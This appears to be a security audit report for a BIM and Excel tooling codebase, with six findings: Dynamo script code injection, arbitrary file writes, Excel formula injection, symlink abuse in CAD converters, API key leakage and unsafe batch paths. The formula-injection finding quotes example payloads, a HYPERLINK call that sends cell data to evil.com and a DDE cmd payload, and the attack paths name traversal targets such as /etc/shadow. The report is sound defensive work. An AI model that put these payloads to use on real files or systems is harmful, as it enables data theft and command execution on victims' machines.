title: Code injection via generation of executable Dynamo script from untrusted Excel data
description: The generate_dynamo_script() method reads arbitrary user data from an Excel spreadsheet (via prepare_updates()), serializes it with json.dumps(), and embeds the output directly into a Python script that is written to disk and intended to be executed inside Revit Dynamo with full Revit API privileges. While json.dumps() escapes string content, it produces JSON booleans (true/false) and nulls (null) which are not valid Python identifiers — causing NameError at runtime and opening the door for a name-hijack attack. An attacker who controls the Excel input can define boolean-typed parameter mappings whose values serialize to the bare name 'true', 'false', or 'null', and then arrange for those names to be bound to malicious callables or objects in the Dynamo IronPython environment. Furthermore, json.dumps outputs are valid Python only by coincidence; any future refactor replacing json.dumps with manual string formatting (e.g., repr(), f-strings) would immediately enable full Python code injection via crafted Excel cell values. The generated script runs TransactionManager operations that can modify the entire Revit model.
impact: An attacker who supplies a malicious Excel file can cause the generated Dynamo script to execute arbitrary code inside the Revit environment, potentially modifying the BIM model, exfiltrating project data, or achieving code execution on the workstation running Dynamo.
attack_path: 1. Attacker crafts an Excel file with malicious values in mapped columns (e.g., element names containing Python-interpretable sequences, boolean columns that serialize to bare 'true'/'false' identifiers)
2. Victim loads the Excel file using ExcelToBIMUpdater.load_excel() and calls prepare_updates()
3. Victim calls generate_dynamo_script(updates, output_path) which embeds the attacker-controlled data into a Python script via json.dumps()
4. The generated script is saved to disk at a user-specified path (arbitrary file write)
5. Victim opens the script in Dynamo, which executes it with full Revit API and file system access

6. The json.dumps-produced 'true'/'false'/'null' tokens resolve to attacker-controlled names if the IronPython namespace has been poisoned, or the script crashes with NameError causing denial of service

evidence.detail: generate_dynamo_script() method begins — constructs Python source from user data
script += json.dumps(updates, indent=2) — injects JSON-serialized user data into Python source; json booleans (true/false) are not valid Python
with open(output_path, 'w') as f: f.write(script) — writes executable Python script to arbitrary path without sanitization
prepare_updates() reads element_id and parameter values from user-supplied DataFrame without validation

remediation: 1. Use json.dumps() output as a separate JSON data file, not embedded Python source. Load it at runtime with json.load(). 2. Alternatively, use ast.literal_eval()-safe repr() for serialization, or use Python's True/False/None instead of JSON booleans. 3. Validate and sanitize all Excel input values before embedding them in generated code. 4. Restrict output_path to a known safe directory. 5. Consider using a templating engine with proper escaping for code generation.

title: Arbitrary file write via unsanitized output_path parameters in script and report generation
description: Multiple methods in ExcelToBIMUpdater accept an output_path parameter and write files to it without any path validation or sandboxing: generate_dynamo_script() writes executable Python code, generate_update_report() writes Excel files, and generate_ifc_updates() writes IFC files. If these functions are exposed through a web API, internal tool, or CI/CD pipeline, an attacker can supply path traversal sequences (e.g., '../../etc/cron.d/payload' or '../../../../autostart/malicious.py') to write files to arbitrary filesystem locations.
impact: An attacker can write files to arbitrary locations on the filesystem, potentially overwriting critical files, placing executable code in autostart directories, or corrupting project data.
attack_path: 1. Attacker provides a crafted output_path parameter containing path traversal sequences (e.g., '../../../.bashrc' or 'C:\Windows\System32\malicious.dll')
2. Application calls generate_dynamo_script(updates, output_path) or generate_update_report(df, updates, output_path)
3. The function calls open(output_path, 'w') or pd.ExcelWriter(output_path) without validating the path
4. File is written to the attacker-specified location with the content controlled by the attacker (for scripts) or partially controlled (for reports)

evidence.detail: open(output_path, 'w') — writes executable Python script to arbitrary user-controlled path
report_df.to_excel(output_path) — writes Excel to arbitrary path
ifc.write(output_ifc) — writes IFC model to arbitrary path
pd.ExcelWriter(output_path) — writes Excel to arbitrary path in export_results()
pd.ExcelWriter(output_path) — writes Excel to arbitrary path in export_report()

remediation: 1. Validate output_path against an allowlist of permitted directories. 2. Use os.path.realpath() to resolve the path and verify it stays within expected boundaries. 3. Reject paths containing '..' traversal sequences. 4. Use a configurable base directory and only allow relative paths within it.

title: Excel formula injection via unsanitized user data written to spreadsheet cells across multiple tools
description: Multiple tools write user-controlled string data directly to Excel cells via pandas DataFrame.to_excel() and pd.ExcelWriter without sanitizing cell values. If any user-supplied field (descriptions, names, notes, locations) begins with '=', '+', '-', or '@', Excel and other spreadsheet applications will interpret the cell as a formula. This enables CSV/Formula Injection attacks where crafted values can execute system commands, make HTTP requests to exfiltrate data, or launch applications when a victim opens the generated Excel file.
impact: An attacker who controls input data (activity descriptions, markup notes, element names, contractor names, etc.) can inject Excel formulas that execute when a project manager or stakeholder opens the generated report. This can lead to arbitrary command execution on the victim's workstation, data exfiltration via HYPERLINK formulas, or social engineering via crafted cell content.
attack_path: 1. Attacker provides input data containing Excel formula payloads (e.g., a work activity description set to '=HYPERLINK("http://evil.com/steal?"&A1&B1,"Click for details")' or '=cmd|'/C calc'!A0')
2. Tool processes the data normally — no input sanitization is performed
3. Tool writes data to Excel file via pandas to_excel() which passes raw strings to openpyxl
4. Victim (project manager, client, stakeholder) opens the generated Excel report
5. Excel interprets formula-prefixed cells and executes the injected formulas
6. Attacker achieves command execution, data exfiltration, or credential theft on victim's machine

evidence.detail: 'Notes': a.notes — user-controlled notes field written directly to Excel cell without sanitization
'Description': a.description — user-controlled description written to Excel cell
'Description': a.description — action item description written to Excel without sanitization
'Description': m.description — markup description written to Excel without sanitization
'Title': s.title — submittal title from contractor written to Excel without sanitization
'Element Name': r.element_name — BIM element name written to Excel without sanitization
'Activity': r.activity_code — activity code written to Excel without sanitization

remediation: 1. Sanitize all string values before writing to Excel cells: prefix any value starting with '=', '+', '-', '@', or tab/CR/LF with a single quote (') character. 2. Implement a sanitization wrapper function like: def safe_cell(val): return "'" + str(val) if str(val).startswith(('=','+','-','@')) else val. 3. Apply sanitization in a centralized DataFrame export utility used by all tools.

title: External process execution with user-controlled file path arguments across CAD converter tools
description: Six CAD converter tools (DWG, DGN, IFC, RVT exporters, and RVT-to-IFC converter) execute external CLI binaries via subprocess.run() with user-controlled file paths as arguments. While the tools use list-based subprocess invocation (avoiding shell injection), the external executables receive user-controlled file paths that are only validated for existence, not for content or path safety. Maliciously crafted filenames (e.g., containing special characters, very long paths, or Unicode tricks) could exploit parsing vulnerabilities in the external executables. Additionally, the file existence check uses Path.exists() which follows symlinks, allowing symlink-based attacks where a symlink points to a sensitive file that the external executable then processes.
impact: An attacker who can control input file paths can potentially exploit vulnerabilities in the external converter executables, cause the executables to process unintended files via symlinks, or trigger unexpected behavior via crafted filenames.
attack_path: 1. Attacker provides a file path that is a symlink pointing to a sensitive file (e.g., a symlink named 'project.dwg' pointing to '/etc/shadow' or a Revit model containing confidential data)
2. The convert() method checks Path.exists() which follows symlinks and returns True
3. subprocess.run([exporter, symlink_path]) passes the symlink to the external executable
4. The external executable follows the symlink and processes the target file
5. The output Excel file is written to the same directory as the input, potentially exposing sensitive data

evidence.detail: dwg_path = Path(dwg_file) — user-controlled path used without canonicalization or symlink check
subprocess.run(cmd, capture_output=True, text=True) — executes external binary with user-controlled path
subprocess.run(cmd, capture_output=True, text=True) — DGN converter with user-controlled path
subprocess.run(cmd, capture_output=True, text=True) — IFC converter with user-controlled path
subprocess.run(cmd, capture_output=True, text=True) — RVT converter with user-controlled path
subprocess.run(cmd, capture_output=True, text=True) — RVT-to-IFC converter with user-controlled path

remediation: 1. Resolve file paths with os.path.realpath() and validate they fall within an expected base directory. 2. Check for and reject symlinks using os.path.islink(). 3. Validate file extensions match expected types. 4. Set a maximum path length. 5. Run external executables with minimal filesystem permissions using a restricted user account or sandbox.

title: API key transmitted as URL query parameter enabling credential leakage via logs and proxies
description: The WeatherDataService._fetch_openweathermap() method transmits the OpenWeatherMap API key as a URL query parameter ('appid') in an HTTP GET request via requests.get(url, params=params). URL query parameters are routinely logged by web servers, CDN edge nodes, corporate proxy servers, SIEM systems, and browser history. This creates multiple opportunities for credential leakage. The API key could also be exposed in stack traces, error logs, or Referer headers if the response page contains links.
impact: The API key is exposed through HTTP access logs, proxy logs, CDN logs, and potentially browser history. An attacker with access to any of these log sources can steal the API key and use it to make unauthorized API calls, potentially exhausting rate limits or incurring costs.
attack_path: 1. Application calls _fetch_openweathermap() which constructs URL with api_key as 'appid' query parameter
2. requests.get() sends HTTP GET request to https://api.openweathermap.org/data/2.5/forecast?lat=...&lon=...&appid=SECRET_KEY&units=metric
3. The full URL including the API key is logged by: corporate proxy servers, CDN access logs, web server access logs, network monitoring tools, browser history (if redirected)
4. An attacker with access to any log source extracts the API key from the URL
5. Attacker uses the stolen API key for unauthorized API access

evidence.detail: url = f"https://api.openweathermap.org/data/2.5/forecast" — base URL for API call
'appid': self.api_key — API key passed as URL query parameter, will appear in server and proxy logs
response = requests.get(url, params=params) — sends API key in URL query string

remediation: 1. Pass the API key in an HTTP header (e.g., 'Authorization' or 'X-API-Key') instead of as a URL query parameter. 2. Note: OpenWeatherMap's API requires 'appid' as a query parameter, so consider using a server-side proxy that adds the key, keeping it out of client-side code. 3. Rotate API keys periodically. 4. Monitor API key usage for anomalies.

title: Directory creation and file write to arbitrary filesystem paths in batch processing
description: The NoBIMVisualizer.batch_generate() method accepts user-controlled xlsx_files paths and output_dir path. It calls Path(output_dir).mkdir(parents=True, exist_ok=True) which creates the entire directory tree for any path, then writes generated image files to that directory. The base_name for output files is derived from the input xlsx file name via Path(xlsx).stem, which is also user-controlled. Combined, an attacker can create arbitrary directories and write PNG files to any writable filesystem location. Additionally, the load_from_excel() method calls pd.read_excel(xlsx_path) on user-supplied paths without validation, enabling arbitrary file reads of Excel-formatted files.
impact: An attacker can create arbitrary directories and write image files to any writable location on the filesystem. In combination with the arbitrary path read via pd.read_excel(), this could be used to read sensitive Excel files and exfiltrate their content via generated visualizations (element names appear in chart labels and titles).
attack_path: 1. Attacker calls batch_generate() with output_dir set to a sensitive directory (e.g., '/var/www/html/uploads/' or a web-accessible path)
2. Path(output_dir).mkdir(parents=True, exist_ok=True) creates the directory tree if it doesn't exist
3. Attacker includes a xlsx_files entry pointing to a sensitive Excel file elsewhere on the system
4. load_from_excel() reads the sensitive file's contents
5. generate_3d_scatter() and generate_category_chart() write PNG files containing data from the sensitive file to the attacker-controlled output directory
6. If the output directory is web-accessible, the attacker retrieves the generated images containing exfiltrated data

evidence.detail: output_dir = Path(output_dir) — user-controlled output directory path
output_dir.mkdir(parents=True, exist_ok=True) — creates arbitrary directory tree from user input
self.elements = pd.read_excel(xlsx_path, sheet_name='Elements') — reads arbitrary Excel files
plt.savefig(output_path, dpi=150, bbox_inches='tight') — writes image file to arbitrary path

remediation: 1. Validate output_dir resolves within an expected base directory using os.path.realpath(). 2. Reject paths containing '..' traversal sequences. 3. Validate xlsx_files paths are within permitted input directories. 4. Use a configurable sandboxed working directory for all file operations.
